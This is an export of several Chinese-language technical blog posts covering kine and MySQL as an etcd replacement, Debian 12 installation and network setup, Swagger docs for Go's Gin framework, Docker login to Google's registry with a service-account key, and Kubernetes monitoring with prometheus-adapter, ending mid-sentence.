/registry/serviceaccounts/kube-system/endpointslice-controller |\r| 1 | /registry/serviceaccounts/kube-system/endpointslicemirroring-controller |\r| 1 | /registry/serviceaccounts/kube-system/ephemeral-volume-controller |\r| 1 | /registry/serviceaccounts/kube-system/expand-controller |\r| 1 | /registry/serviceaccounts/kube-system/generic-garbage-collector |\r| 1 | /registry/serviceaccounts/kube-system/horizontal-pod-autoscaler |\r| 1 | /registry/serviceaccounts/kube-system/job-controller |\r| 1 | /registry/serviceaccounts/kube-system/namespace-controller |\r| 1 | /registry/serviceaccounts/kube-system/node-controller |\r| 1 | /registry/serviceaccounts/kube-system/persistent-volume-binder |\r| 1 | /registry/serviceaccounts/kube-system/pod-garbage-collector |\r| 1 | /registry/serviceaccounts/kube-system/pv-protection-controller |\r| 1 | /registry/serviceaccounts/kube-system/pvc-protection-controller |\r| 1 | /registry/serviceaccounts/kube-system/replicaset-controller |\r| 1 | /registry/serviceaccounts/kube-system/replication-controller |\r| 1 | /registry/serviceaccounts/kube-system/resourcequota-controller |\r| 1 | /registry/serviceaccounts/kube-system/root-ca-cert-publisher |\r| 1 | /registry/serviceaccounts/kube-system/service-account-controller |\r| 1 | /registry/serviceaccounts/kube-system/service-controller |\r| 1 | /registry/serviceaccounts/kube-system/statefulset-controller |\r| 1 | /registry/serviceaccounts/kube-system/token-cleaner |\r| 1 | /registry/serviceaccounts/kube-system/ttl-after-finished-controller |\r| 1 | /registry/serviceaccounts/kube-system/ttl-controller |\r| 1 | /registry/services/endpoints/default/kubernetes |\r| 1 | /registry/services/specs/default/kubernetes |\r| 1 | compact_rev_key |\r+-----------+---------------------------------------------------------------------------------------------+\r271 rows in set (0.00 sec)\r如上所示，有一个名为的表 “kine”包含所有数据。Kine 使用数据库作为日志结构存储，因此来自 API 服务器的每次写入都会创建一个新行来存储已创建或更新的 Kubernetes 对象，“name” 列使用与 etcd 相同的存储结构 “/registry/RESOURCE_TYPE/NAMESPACE/NAME” 表示集群中对象。\nk3s 资源分析 k3s 官方提供了 Resource Profiling [5] 来对比了 RDBMS 与 etcd 的性能对比。\n总结 因为 RDBMS 大家都很熟悉，并且更高性能的分布式解决方案也有很多，例如 YugabyteDB (PostgreSQL兼容的分布式数据库)，也可以预创建 kine 表，通过分区形式将不同数据存储到不同的分区内。而且 k8s 对象的历史数据也是可以根据一定的规则进行删除，因为 kubernetes 中的对象都是实时协调的，所以也不怕误删除，这样就会使得 kubernetes 规模有更大扩展的可能。\nReference [1] Worrying state of Etcd community\n[2] Kine (Kine is not etcd)\n[3] Installing kubeadm, kubelet and kubectl\n[4] Minimal example of using kine\n[5] resource-profiling\n[6] Goodbye etcd, Hello PostgreSQL: Running Kubernetes with an SQL Database\n","permalink":"https://www.oomkill.com/2024/06/kubernetes-without-etcd-step-by-step/","summary":"","title":"构建集群kubernetes v1.28并使用kine和mysql替换etcd"},{"content":"设置一个网络接口 debian 中网络接口的配置文件是在 /etc/network/interfaces，可以设置 “静态地址” 或 “DHCP”\ncat /etc/network/interfaces # This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). source /etc/network/interfaces.d/* # The loopback network interface auto lo auto ens33 iface lo inet loopback # The primary network interface allow-hotplug ens33 iface ens33 inet static address 10.0.0.14 netmast 255.255.255.0 gateway 10.0.0.2 root@debian-template:~# cat /etc/network/interfaces # This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). source /etc/network/interfaces.d/* # The loopback network interface # 网络接口自动启动 auto lo auto ens33 # 使用dhcp配置网络接口 iface eth0 inet dhcp iface lo inet loopback # The primary network interface allow-hotplug ens33 # 使用静态地址配置网络接口 iface ens33 inet static address 10.0.0.14 netmast 255.255.255.0 gateway 10.0.0.2 Enjoy 👏👏\nReference NetworkConfiguration\n","permalink":"https://www.oomkill.com/2024/06/debian-network-configration/","summary":"","title":"Debian网络配置"},{"content":"Preparation debian12 几乎可以使用任何旧的计算机硬件，因为最小安装的要求非常低。以下是最低要求和推荐要求：\n最低要求 推荐要求 存储：10 Gigabytes\n内存：512 Megabytes\nCPU: 1 GigaHertz 存储：10 Gigabytes内存：2 GigabytesCPU: 1 GigaHertz or more 如何选择下载安装包 offical mirror aliyun mirror 官网提供了安装包的下载，其中CD是网络安装，DVD是离线安装\ndebian官方下载页面 Notes：CD安装包很小，下载下来是 debian-11.4.0-amd64-netinst.iso 如名所示，这是一个网络安装包，所以推荐下载DVD部分，可以达到离线安装的效果\n截至文章编写日期，debian-12.5.0-amd64-DVD-1.iso 大小是 3.7G\nDebian12 EOL：June 30th, 2028\n安装步骤 在界面中选择“Install”，安装将开始。如果图形化安装可以选择“Graphical install”，这里选择“Install”。\n欢迎页面 完成后，系统将提示选择安装时的“语言”。选择喜欢的语言，然后按“Enter”。这里选择英文\n选择语言页面 这将是接下来安装步骤\n安装步骤概述 选择位置与键盘布局 选择地区，这里选择美国\n选择区域 下面部署时选择键盘布局：中国大陆使用的键盘布局是美国-英语，不要选择英国-英语之类，布局是不一样的，会存在按键输出的结果会不同\n选择键盘布局 完成上述操作后，将开始加载镜像。等待扫描完成。。。。\n等待扫描组件 设置主机名和域名 这步骤中将配置一个“主机名”。与一个“域”名称。\n配置主机名 “域” 可以选择留空确定\n配置域 完成上述操作后，安装程序将提示需要设置 root 密码。输入您的 root 密码，然后在重新输入以进行验证后继续。\nTips: 这里建议设置密码，不设置密码会导致安装完成后无法进入 root 用户**，**这样就需要根据先登录普通用户，然后通过 sudo切换过去。\n设置Root密码 设置Root密码 - 二次确认 设置非ROOT用户名、账户和密码 下一步创建一个非ROOT用户，这个步骤是必须的，并为这个新创建的帐户分配一个密码。以下截图将描述将如何完成此操作。\n配置普通用户 为这个用户配置密码\n为普通用户配置密码 为普通用户配置密码——二次确认 设置时钟时区 当下面进度条完成后，则会进入设置时区的界面\n从互联网设置网络时间服务 Eastern 美东时间\nCentral 北美中部\nMountain 北美山区时区\nPacific 太平洋时区\nAlaska 阿拉斯加夏令时间\nHawaii 夏威夷时区\nArizona 亞利桑时区\nEast Indiana 印第安纳时区\nSamoa 萨摩亚时间\n配置时区 对磁盘分区 此步骤磁盘进行分区。这里选择 “手动” 选项\n选择分区模式 选择手动进行划分为所需的分区。\n选择硬盘 创建新的分区表\n创建分区表 选择空闲的空间进行分区\n选择空闲空间 创建一个新分区\n创建一个新分区 为/boot划分分区\n为/boot分区分配空间 挂载点选择 boot\n选择挂载点 最终划分的分区 这里选No就行，提示是指不使用swap分区，No就是继续，Yes将返回分区页面\n对于swap分区的提示 创建新分区需要格式化，当前的分区将会被删除，如果是新磁盘选择Yes格式化分区\n确认格式化，进行分区 Base System安装 这里等待安装基础系统\n确认格式化，进行分区 几分钟后， 安装后会弹出一个界面，这里会扫描其他的媒介 (media)，这里因为没有，选择No就行。\n扫描其他媒介 包管理镜像配置，这里选择 “No” 以加快安装速度\n包管理提示 离线安装 会扫描安装的媒介，这里也有提示，如果没有额外的媒介，可以跳过该步骤\n扫描其他媒介 配置网络镜像，建议配置下，如果不需要No即可\nTips: 如果选择 “No” , 那么安装完后，是没有apt包管理的仓库配置的，需要自行修改 /etc/apt/sources.list 文件\n配置网络镜像 如果上面选择了 “No” 下面配置镜像地址部分则不会出现，可以直接跳转到 “根据要求调整安装” 的步骤\n接下来会弹出一个界面，请选择 “Debian镜像国家” 。这个是配置镜像地址的，选择自己的国家和镜像站即可\n选择镜像国家 这里选择的是中国和中科大镜像\n选择镜像地址 配置HTTP代理，不选择跳过\n配置http代理 如果选择网络安装，到这步骤时安装程序现在将在选择相关的。首先，选择离您所在国家最近的位置。Debian 镜像位置和域后检索剩余的文件\n这里提示有一个匿名调查，这里选No即可\n匿名调查 根据要求调整安装 在检索过程中，系统将提示需要自行选择以下预定义软件中的一个或多个。最小化安装仅选择基础系统与SSH即可\n安装组件选择 接下来等待安装即可\n安装过程 Notes：选择了DVD ISO将离线完成安装，如果使用了CD ISO，将从互联网上检索包并安装，这个时间将很长。\n其中会提示一个引导按章，直接Yes即可\n到了这里即将安装完成\n到了这里即将安装完成 完成Debian12最小化安装 看到到这里已经完成了安装，按“Continue”继续重启后即可\n完成安装 看到系统的引导界面 Enjoy 👏👏\n","permalink":"https://www.oomkill.com/2024/06/debian12-install-tutorial-step-by-step/","summary":"","title":"安装Debian12 (Bookworm) Step-by-Step"},{"content":"OpenAPI 什么是OpenAPI Swagger 是一套围绕 OpenAPI 规范构建的开源工具，可帮助我们设计，构建，记录和使用 REST API。\nOpenAPI 规范（前名称为 Swagger 规范）是 REST API 的 API 描述格式。包括：\n可用端点 ( 例如 /users) 以及每个 endpoint 上的操作 (例如 GET /users, POST /users) 操作参数，每个操作的输入和输出 认证方法 联系信息，许可证，使用条款等其他信息。 什么是 Swagger？ Swagger 是一组围绕 OpenAPI 规范构建的开源工具，有助于用户设计，构建，记录和使用 REST API，支持整个 API 生命周期的开发，从设计和文档到测试和部署。\n使用 Swagger 的目的 标准化文档格式：Swagger (OpenAPI) 采用了准化 API 文档格式。通过使用 Swaggo（将注释转换为 Swagger2.0文档的包） 生成 Swagger 文档，Swagger 的结构化格式的文档，使开发人员更容易理解产品的 API 交互。 交互式文档体验：Swagger UI 与 Swaggo 集成，提供交互式且用户友好的界面，用于测试 API。Swaggo提供了一个自动生成的界面，允许开发人员浏览 Endpoint，查看请求/响应示例，甚至可以直接从文档执行 API 请求。这种交互式体验可提高开发人员的工作效率并加速 API 的采用。 自动且最新的文档：Swaggo 可自动从用户的 Go 代码生成 API 文档。这种自动化无需手动维护单独的文档文件。Swaggo 直接从用户的代码库中提取信息，包括 endpoint 详细信息，请求/响应模型和注释。使用这种方法可确保用户的 API 文档随着代码的更新而保持最新。 Swagger 与 Gin 的集成 拉取 Swaggo 使用如下命令下载swag\n$ go install github.com/swaggo/swag/cmd/swag\r与 Gin 的集成 添加通用注释 swaggo 中包含两种注释，通用注释与 API 注释，通用注释是用于程序 main.go 中，标记文档的信息，API 注释是用于标注每个接口的信息。\n下载相关包 $ go install github.com/swaggo/swag/cmd/swag\r$ go get -v github.com/swaggo/gin-swagger # gin-swagger middleware\r$ go get -v github.com/swaggo/files # swagger embed files\r在项目 main.go 源代码中添加通用的 API 注释： // @title Swagger Example API\r// @version 1.0\r// @description This is a sample server celler server.\r// @termsOfService http://swagger.io/terms/\r// @contact.name API Support\r// @contact.url http://www.swagger.io/support\r// @contact.email support@swagger.io\r// @license.name Apache 2.0\r// @license.url http://www.apache.org/licenses/LICENSE-2.0.html\r// @host localhost:8080\r// @BasePath /api/v1\r// @securityDefinitions.basic BasicAuth\r// @externalDocs.description OpenAPI\r// @externalDocs.url https://swagger.io/resources/open-api/\rfunc main() {\rr := gin.Default()\r...\r}\r为 Swagger Docs 添加路由 以将中间件添加到您的 Gin 应用程序中。在您的路由函数中或者主函数中，添加如下下代码：\n此代码为 Swagger UI 设置了一条路由，并告诉它在指定的 URL 处查找 Swagger 文档。\n// 默认路由\rr := gin.Default()\rurl := ginSwagger.URL(\u0026quot;http://localhost:8080/swagger/doc.json\u0026quot;)\rr.GET(\u0026quot; /swagger/*any\u0026quot;, ginSwagger.WrapHandler(swaggerFiles.Handler, url))\r// 路由组\r// 如果已存在路由组，可以在对应注册路由的函数中添加 docs 路径\rfunc RegisteredRouter(e *gin.Engine) {\re.Handle(\u0026quot;GET\u0026quot;, \u0026quot;/swagger/*any\u0026quot;,\rginSwagger.WrapHandler(swaggerFiles.Handler, ginSwagger.URL(\u0026quot;/swagger/doc.json\u0026quot;)))\r...\r}\r向 Gin API 服务器添加 API 注释 // ShowAccount godoc\r// @Summary Show an account\r// @Description get string by ID\r// @Tags accounts\r// @Accept json\r// @Produce json\r// @Param id path int true \u0026quot;Account ID\u0026quot;\r// @Success 200 {object} model.Account\r// @Failure 400 {object} httputil.HTTPError\r// @Failure 404 {object} httputil.HTTPError\r// @Failure 500 {object} httputil.HTTPError\r// @Router /accounts/{id} [get]\rfunc (c *Controller) ShowAccount(ctx *gin.Context) {\r生成 Swagger 文档 将注释添加到代码后，可以通过运行以下命令生成 Swagger 文档\n$ swag init -g cmd/main.go --output ./docs/ --packageName docs\r此命令将会在项目中 docks 文件夹中生成一个文件 doc.json 。我们之前添加的中间件将使用此文件在 Swagger UI 中显示文档。\n确保导入了生成的包 docs/docs.go 文件，这样特定的配置文件才会被初始化。如果通用 API 注释没有写在 main.go 中，可以使用 -g 参数来告知 swag-cli\n$ swag init -g http/api.go\r访问 swagger 文档 在完成上述步骤后，可以浏览器中访问 http://{project_domain}/swagger/index.html，来查看 swagger 文档，这个路径取决于在 gin 路由里配置的路径。\nswagger 注释 通用 API 注释 注释 说明 示例 title 必填 应用程序的名称。 // @title Swagger Example API version 必填 提供应用程序API的版本。 // @version 1.0 description 应用程序的简短描述。 // @description This is a sample server celler server. tag.name 标签的名称。 // @tag.name This is the name of the tag tag.description 标签的描述。 // @tag.description Cool Description tag.docs.url 标签的外部文档的URL。 // @tag.docs.url https://example.com tag.docs.description 标签的外部文档说明。 // @tag.docs.description Best example documentation termsOfService API的服务条款。 // @termsOfService http://swagger.io/terms/ contact.name 公开的API的联系信息。 // @contact.name API Support contact.url 联系信息的URL。 必须采用网址格式。 // @contact.url http://www.swagger.io/support contact.email 联系人/组织的电子邮件地址。 必须采用电子邮件地址的格式。 // @contact.email support@swagger.io license.name 必填 用于API的许可证名称。 // @license.name Apache 2.0 license.url 用于API的许可证的URL。 必须采用网址格式。 // @license.url http://www.apache.org/licenses/LICENSE-2.0.html host 运行API的主机（主机名或IP地址）。 // @host localhost:8080 BasePath 运行API的基本路径。 // @BasePath /api/v1 accept API 可以使用的 MIME 类型列表。 请注意，Accept 仅影响具有请求正文的操作，例如 POST、PUT 和 PATCH。 值必须如“Mime类型”中所述。 // @accept json produce API可以生成的MIME类型的列表。值必须如“Mime类型”中所述。 // @produce json query.collection.format 请求URI query里数组参数的默认格式：csv，multi，pipes，tsv，ssv。 如果未设置，则默认为csv。 // @query.collection.format multi schemes 用空格分隔的请求的传输协议。 // @schemes http https externalDocs.description Description of the external document. // @externalDocs.description OpenAPI externalDocs.url URL of the external document. // @externalDocs.url https://swagger.io/resources/open-api/ x-name 扩展的键必须以x-开头，并且只能使用json值 // @x-example-key {\u0026ldquo;key\u0026rdquo;: \u0026ldquo;value\u0026rdquo;} API 注释 注释 描述 description 操作行为的详细说明。 description.markdown 应用程序的简短描述。该描述将从名为 endpointname.md 的文件中读取。 id 用于标识操作的唯一字符串。在所有 API 操作中必须唯一。 tags 每个 API 操作的标签列表，以逗号分隔。 summary 该操作的简短摘要。 accept API 可以使用的 MIME 类型列表。 请注意，Accept 仅影响具有请求正文的操作，例如 POST、PUT 和 PATCH。 值必须如 “Mime类型” 中所述。 produce API可以生成的MIME类型的列表。值必须如 “Mime类型” 中所述。 param 用空格分隔的参数。\nparam name,\nparam type,\ndata type,\nis mandatory?,\ncomment attribute(optional) security 每个 API 操作的安全性。 success 以空格分隔的成功响应。return code,{param type},data type,comment failure 以空格分隔的故障响应。return code,{param type},data type,comment response 与success、failure作用相同 header 以空格分隔的头字段。 return code,{param type},data type,comment router 以空格分隔的路径定义。 path,[httpMethod] deprecatedrouter 与router相同，但是是deprecated的。 x-name 扩展字段必须以 x- 开头，并且只能使用 json 值。 deprecated 将当前 API 操作的所有路径设置为deprecated 安全相关参数 注释 描述 参数 示例 securitydefinitions.basic Basic auth. // @securityDefinitions.basic BasicAuth securitydefinitions.apikey API key auth. in, name // @securityDefinitions.apikey ApiKeyAuth securitydefinitions.oauth2.application OAuth2 application auth. tokenUrl, scope // @securitydefinitions.oauth2.application OAuth2Application securitydefinitions.oauth2.implicit OAuth2 implicit auth. authorizationUrl, scope // @securitydefinitions.oauth2.implicit OAuth2Implicit securitydefinitions.oauth2.password OAuth2 password auth. tokenUrl, scope // @securitydefinitions.oauth2.password OAuth2Password securitydefinitions.oauth2.accessCode OAuth2 access code auth. tokenUrl, authorizationUrl, scope // @securitydefinitions.oauth2.accessCode OAuth2AccessCode troubleshooting Failed to load API definition. 引用了 swaggo 的文件必须添加下面包引用\n_ \u0026quot;project_root_dir/cmd/docs\u0026quot;\rfailed to load api definition. not found /swagger/v1/swagger.json 指定 doc 文档路径必须写对 [ginSwagger.URL(\u0026quot;/swagger/doc.json\u0026quot;)]\n// 默认路由\rr := gin.Default()\rurl := ginSwagger.URL(\u0026quot;http://localhost:8080/swagger/doc.json\u0026quot;)\rr.GET(\u0026quot; /swagger/*any\u0026quot;, ginSwagger.WrapHandler(swaggerFiles.Handler, url))\r// 路由组\r// 如果已存在路由组，可以在对应注册路由的函数中添加 docs 路径\rfunc RegisteredRouter(e *gin.Engine) {\re.Handle(\u0026quot;GET\u0026quot;, \u0026quot;/swagger/*any\u0026quot;,\rginSwagger.WrapHandler(swaggerFiles.Handler, ginSwagger.URL(\u0026quot;/swagger/doc.json\u0026quot;)))\rcannot find type definition: api_query.UserQuery 如果参数引用了一个对象，不可以写成 \u0026amp;api_query.UserQuery 的格式\nParseComment error in file :missing required param comment parameters \u0026ldquo;xxx\u0026rdquo; 你的项目内其他非 API 接口的函数不能使用与 API 注释相同格式的注释\ncannot find type definition: errcode.Error Reference [1] \u0026ldquo;Failed to load API definition\u0026rdquo; / \u0026ldquo;not yet registered swag\u0026rdquo; error when rendering docs page #830\n[2] localhost:8080/swagger returns 404 page not found #2\n[3] Implementing Swagger in Go Projects\n[4] How to add Swagger in Golang Gin.\n[5] Swagger使用的时候报错：Failed to load API definition\n[6] README_zh-CN.md\n[7] Golang swaggo rendering error: \u0026ldquo;Failed to load API definition\u0026rdquo; and \u0026ldquo;Fetch error doc.json\u0026rdquo;\n","permalink":"https://www.oomkill.com/2024/06/golib-go-swagger/","summary":"","title":"Go每日一库 - 使用 gin + goswagger 构建 REST API 文档"},{"content":"创建服务账户 首先可以到「 IAM管理 -\u0026gt; 服务帐户」新增帐户。在新增完成后，会得到一把 key，将它下载后请妥善保管，因为所有相关的身份认证都会用到，这个 key 在下载后就无法继续下载了。\n授权 接着到「IAM -\u0026gt; 新增」成员，并且选择角色，这里选择「Cloud Storage -\u0026gt; 储存空间物件检视者」，让此帐户具备有 read（读取） storage 的功能。\n登录 cat KEY-FILE | docker login -u KEY-TYPE --password-stdin \\ https://LOCATION-docker.pkg.dev GCP 的 KEY-TYPE 通为 json_key，但这里包含两种类型 _json_key 和 _json_key_base64\nKEY-FILE 就是下载的 Service account key 的文件\ncat KEY-FILE | docker login -u _json_key --password-stdin \\ https://LOCATION-docker.pkg.dev 通常 Service account key 文件内容如下\n{ \u0026quot;type\u0026quot;: \u0026quot;service_account\u0026quot;, \u0026quot;project_id\u0026quot;: \u0026quot;project2024-0101\u0026quot;, \u0026quot;private_key_id\u0026quot;: \u0026quot;bdfsd612779509406bb8452c3ek12d730ed547e722d\u0026quot;, \u0026quot;private_key\u0026quot;: \u0026quot;-----BEGIN PRIVATE KEY----....-----END PRIVATE KEY-----\\n\u0026quot;, \u0026quot;client_email\u0026quot;: \u0026quot;gcr@project2024-0101.iam.gserviceaccount.com\u0026quot;, \u0026quot;client_id\u0026quot;: \u0026quot;206651723512339084907274\u0026quot;, \u0026quot;auth_uri\u0026quot;: \u0026quot;https://accounts.google.com/o/oauth2/auth\u0026quot;, \u0026quot;token_uri\u0026quot;: \u0026quot;https://oauth2.googleapis.com/token\u0026quot;, \u0026quot;auth_provider_x509_cert_url\u0026quot;: \u0026quot;https://www.googleapis.com/oauth2/v1/certs\u0026quot;, \u0026quot;client_x509_cert_url\u0026quot;: \u0026quot;https://www.googleapis.com/robot/v1/metadata/x509/manager-image%40project2024-0101.iam.gserviceaccount.com\u0026quot;, \u0026quot;universe_domain\u0026quot;: \u0026quot;googleapis.com\u0026quot; } ","permalink":"https://www.oomkill.com/2024/06/docker-push-gcr/","summary":"","title":"使用docker管理谷歌物件仓库gcr上的镜像"},{"content":"Kubernetes监控架构设计 k8s监控设计背景说明 根据 Kubernetes监控架构 1，Kubernetes 集群中的 metrcis 可以分为 系统指标 (Core Metrics) 和 服务指标 (service metrics) ; 系统指标(System metrics) 是通用的指标，通常可以从每一个被监控的实体中获得（例如，容器和节点的CPU和内存使用情况）。服务指标(Service metrics) 是在应用程序代码中显式定义并暴露的 (例如，API Server 处理的 500 错误数量)。\nKubernetes将系统指标分为两部分：\n核心指标 (core metrics) 是 Kubernetes 理解和用于其内部组件和核心工具操作的指标，例如：用于调度的指标 (包括资源估算算法的输入, 初始资源/VPA (vertical autoscaling)，集群自动扩缩 (cluster autoscaling)，水平Pod自动扩缩 (horizontal pod autoscaling ) 除自定义指标之外的指标)；Kube Dashboard 使用的指标，以及 “kubectl top” 命令使用的指标。 非核心指标 (non-core metrics) 是指不被 Kubernetes 解释的指标。我们一般假设这些指标包含核心指标 (但不一定是 Kubernetes 可理解的格式)，以及其他额外的指标。 所以，kubernetes monitoring 的架构被设计拥有如下特点：\n通过标准的主 API (当前为主监控 API) 提供关于Node, Pod 和容器的核心系统指标，使得核心 Kubernetes 功能不依赖于非核心组件 kubelet 只导出有限的指标集，即核心 Kubernetes 组件正常运行所需的指标。 \u0026hellip; 监控管道 Kubernetes 监控管道分为两个：\n核心指标管道 (core metrics pipeline) 由 Kubelet、资源估算器, 一个精简版 Heapster (metrics-server)，以及 api-server 中 master metrics API 组成。这些指标被核心系统组件使用，例如调度逻辑（如调度器和基于系统指标的HPA）和一些简单 UI 组件（如 kubectl top），这个管道并不打算与第三方监控系统集成。 监控管道：一个用于收集系统中的各种指标并将其暴露给最终用户端，以及通过适配器暴露给 HPA(用于自定义指标) 和 Infrastore 的。用户可以选择多种监控系统供应商（例如 Prometheus, metric-server），也可以完全不使用。 Core Metrics Pipeline 根据 kubernetes 监控设计文档可以得知，核心指标指\n使用这组核心指标，由Kubelet收集，并仅供 Kubernetes 系统组件使用，支持\u0026quot;第一类资源隔离和利用特性\u0026quot;。 不设计成面向用户的 API，而是尽可能通用，以支持未来的用户级组件。 核心指标的包含三类：\nCpuUsage: 记录从创建对象开始的累计CPU使用时间。 MemoryUsage: 记录工作集内存使用量。 FilesystemUsage: 记录文件系统使用情况,包括已用字节数和已用Inode数。 Monitoring Pipeline 根据 Kubernetes 监控设计文档 1 得知，监控管道用于与核心Kubernetes组件分开的系统，可以更加灵活。并且监控管道可以收集不同类型的指标：\nCore system metrics Non-core system metrics Service metrics from user application containers Service metrics from Kubernetes infrastructure containers (using Prometheus instrumentation) 监控管道主要用于根据自定义指标进行 HPA，监控管道提供了一个无状态的 API Adapter，用于拉去监控给 HPA\n指标API API类别 根据监控架构设计文档，Kubernetes 定义了两套指标 API，资源指标 API 和 自定义指标 API；Kubernetes 为资源指标 API 提供了两种实现：Heapster 和 metrics-server，而自定义指标 API 由不同的监控供应商实现。下面将详细描述每个 API。\n资源指标 API (Resource Metrics API)：该 API 允许消费者访问 Pod 和 Node 的资源指标（CPU \u0026amp; Memory）\nThe API is implemented by metrics-server and prometheus-adapter. 自定义指标 API (Custom Metrics API)：该 API 允许消费者访问描述 Kubernetes 资源的任意指标。\n用户可以根据 kubernetes-sigs/custom-metrics-apiserver 仓库来自定义 API-server API的访问 资源指标，该 API 是在 /apis/metrics.k8s.io/ ，可以使用 kubectl proxy --port 8080 代理后进行访问，\n$ kubectl proxy --port=8080 $ curl localhost:8080/apis/metrics.k8s.io/v1beta1/nodes 或者使用 kubectl get --raw 进行获取\n$ kubectl get --raw \u0026quot;/apis/metrics.k8s.io/v1beta1/nodes\u0026quot; | jq 自定义指标，该 API 是在 /apis/custom.metrics.k8s.io/ ，访问的方式相同，用户通过该 PATH 进行访问。\n# 查看有哪些指标可用 $ kubectl get --raw \u0026quot;/apis/custom.metrics.k8s.io/v1beta1/\u0026quot; | jq Prometheus-adapter 通过上一章节介绍了kubernetes监控体系，这已经可以了解到了 prometheus-adapter 的定位；prometheus-adapter 是通过 kubernetes custom-metrics-apiserver 标准实现的一个 custom.metrics.k8s.io API，用于提供给 HPA 的一种指标适配器，可以将任何指标转化为 HPA 可用的指标。他全名为 Kubernetes Custom Metrics Adapter for Prometheus。\nprometheus-adapter配置文件详解 prometheus-adapter负责确定哪些指标以及如何去发现这些指标，根据这个标准，配置文件分为四个步骤来完成这套 “发现” 规则\n每一个指标可以大致分为四个部分，对应在配置文件中：\nDiscovery ，用于指定 adapter 应如何查找此规则的所有Prometheus指标。 Association ，用于指定 adapter 应如何确定特定指标与哪些 Kubernetes 资源相关联。 Naming ，用于指定 adapter 应如何在自定义指标 API 中公开该指标。 Querying ，用于指定如何将针对一个或多个 Kubernetes 对象的特定指标请求转换为对 Prometheus 的查询。 配置文件如下所示，这是官方给出的样板配置文件（文章编写时版本为0.12）\nrules: # Each rule represents a some naming and discovery logic. # Each rule is executed independently of the others, so # take care to avoid overlap. As an optimization, rules # with the same `seriesQuery` but different # `name` or `seriesFilters` will use only one query to # Prometheus for discovery. # some of these rules are taken from the \u0026quot;default\u0026quot; configuration, which # can be found in pkg/config/default.go # this rule matches cumulative cAdvisor metrics measured in seconds - seriesQuery: '{__name__=~\u0026quot;^container_.*\u0026quot;,container!=\u0026quot;POD\u0026quot;,namespace!=\u0026quot;\u0026quot;,pod!=\u0026quot;\u0026quot;}' resources: # skip specifying generic resource\u0026lt;-\u0026gt;label mappings, and just # attach only pod and namespace resources by mapping label names to group-resources overrides: namespace: {resource: \u0026quot;namespace\u0026quot;} pod: {resource: \u0026quot;pod\u0026quot;} # specify that the `container_` and `_seconds_total` suffixes should be removed. # this also introduces an implicit filter on metric family names name: # we use the value of the capture group implicitly as the API name # we could also explicitly write `as: \u0026quot;$1\u0026quot;` matches: \u0026quot;^container_(.*)_seconds_total$\u0026quot; # specify how to construct a query to fetch samples for a given series # This is a Go template where the `.Series` and `.LabelMatchers` string values # are available, and the delimiters are `\u0026lt;\u0026lt;` and `\u0026gt;\u0026gt;` to avoid conflicts with # the prometheus query language metricsQuery: \u0026quot;sum(rate(\u0026lt;\u0026lt;.Series\u0026gt;\u0026gt;{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;,container!=\u0026quot;POD\u0026quot;}[2m])) by (\u0026lt;\u0026lt;.GroupBy\u0026gt;\u0026gt;)\u0026quot; # this rule matches cumulative cAdvisor metrics not measured in seconds - seriesQuery: '{__name__=~\u0026quot;^container_.*_total\u0026quot;,container!=\u0026quot;POD\u0026quot;,namespace!=\u0026quot;\u0026quot;,pod!=\u0026quot;\u0026quot;}' resources: overrides: namespace: {resource: \u0026quot;namespace\u0026quot;} pod: {resource: \u0026quot;pod\u0026quot;} seriesFilters: # since this is a superset of the query above, we introduce an additional filter here - isNot: \u0026quot;^container_.*_seconds_total$\u0026quot; name: {matches: \u0026quot;^container_(.*)_total$\u0026quot;} metricsQuery: \u0026quot;sum(rate(\u0026lt;\u0026lt;.Series\u0026gt;\u0026gt;{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;,container!=\u0026quot;POD\u0026quot;}[2m])) by (\u0026lt;\u0026lt;.GroupBy\u0026gt;\u0026gt;)\u0026quot; # this rule matches cumulative non-cAdvisor metrics - seriesQuery: '{namespace!=\u0026quot;\u0026quot;,__name__!=\u0026quot;^container_.*\u0026quot;}' name: {matches: \u0026quot;^(.*)_total$\u0026quot;} resources: # specify an a generic mapping between resources and labels. This # is a template, like the `metricsQuery` template, except with the `.Group` # and `.Resource` strings available. It will also be used to match labels, # so avoid using template functions which truncate the group or resource. # Group will be converted to a form acceptible for use as a label automatically. template: \u0026quot;\u0026lt;\u0026lt;.Resource\u0026gt;\u0026gt;\u0026quot; # if we wanted to, we could also specify overrides here metricsQuery: \u0026quot;sum(rate(\u0026lt;\u0026lt;.Series\u0026gt;\u0026gt;{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;,container!=\u0026quot;POD\u0026quot;}[2m])) by (\u0026lt;\u0026lt;.GroupBy\u0026gt;\u0026gt;)\u0026quot; # this rule matches only a single metric, explicitly naming it something else # It's series query *must* return only a single metric family - seriesQuery: 'cheddar{sharp=\u0026quot;true\u0026quot;}' # this metric will appear as \u0026quot;cheesy_goodness\u0026quot; in the custom metrics API name: {as: \u0026quot;cheesy_goodness\u0026quot;} resources: overrides: # this should still resolve in our cluster brand: {group: \u0026quot;cheese.io\u0026quot;, resource: \u0026quot;brand\u0026quot;} metricsQuery: 'count(cheddar{sharp=\u0026quot;true\u0026quot;})' # external rules are not tied to a Kubernetes resource and can reference any metric # https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale-walkthrough/#autoscaling-on-metrics-not-related-to-kubernetes-objects externalRules: - seriesQuery: '{__name__=\u0026quot;queue_consumer_lag\u0026quot;,name!=\u0026quot;\u0026quot;}' metricsQuery: sum(\u0026lt;\u0026lt;.Series\u0026gt;\u0026gt;{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;}) by (name) - seriesQuery: '{__name__=\u0026quot;queue_depth\u0026quot;,topic!=\u0026quot;\u0026quot;}' metricsQuery: sum(\u0026lt;\u0026lt;.Series\u0026gt;\u0026gt;{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;}) by (name) # Kubernetes metric queries include a namespace in the query by default # but you can explicitly disable namespaces if needed with \u0026quot;namespaced: false\u0026quot; # this is useful if you have an HPA with an external metric in namespace A # but want to query for metrics from namespace B resources: namespaced: false # TODO: should we be able to map to a constant instance of a resource # (e.g. `resources: {constant: [{resource: \u0026quot;namespace\u0026quot;, name: \u0026quot;kube-system\u0026quot;}}]`)? Discovery Discovery 部分控制了查找要在自定义指标 API 中公开的指标的过程。其中有两个关键字段：seriesQuery 和 seriesFilters。\nseriesQuery 指定了用于查找某些 Prometheus series 的 Prometheus series 查询(作为传递给 Prometheus 